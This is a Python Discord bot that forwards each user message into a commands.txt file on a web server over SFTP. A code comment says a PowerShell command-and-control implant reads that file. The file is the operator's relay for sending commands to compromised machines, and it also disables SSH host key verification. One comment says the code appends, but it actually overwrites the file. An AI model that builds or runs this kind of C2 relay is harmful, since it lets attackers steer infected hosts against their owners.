import discord
from discord.ext import commands
import pysftp
from flask import Flask, render_template, redirect
from threading import Thread

# start a flask server to keep online (use uptimerobot.com to keep pinging this bot)
app = Flask('')
@app.route('/')
def index():
  return 'Bot is online!'
def run():
  app.run(host="0.0.0.0", port=8080)
def webserver():
  server = Thread(target=run)
  server.start()
webserver()

# Ignore host keys for FTP connections
cnopts = pysftp.CnOpts()
cnopts.hostkeys = None

# Your Credentials
DISCORD_TOKEN = 'YOUR_DISCORD_BOT_TOKEN'
SFTP_SERVER = 'YOUR.SER.VER.IP'
SFTP_PORT = 22
SFTP_USERNAME = 'FTPusername'
SFTP_PASSWORD = 'FTPpassword'
# Must be in webserver location (powershell C2 reads from HTTP-server)
REMOTE_FILE_PATH = '/var/www/html/commands.txt'


# Discord intents setup
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user.name}')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    # Check if the message is not from the bot itself
    if message.author.bot:
        return

    # Edit remote text file using SFTP
    try:
          with pysftp.Connection(SFTP_SERVER, username=SFTP_USERNAME, password=SFTP_PASSWORD, port=SFTP_PORT, cnopts=cnopts) as sftp:
          
            # Append the new message to the existing content
            new_content = f"\n{message.content}"

            # Write the updated content back to the file
            with sftp.open(REMOTE_FILE_PATH, 'w') as file:
                file.write(new_content)

            print('Message added to remote file via SFTP')

    except Exception as e:
        print(f'Error editing remote file: {e}')

    await bot.process_commands(message)

bot.run(DISCORD_TOKEN)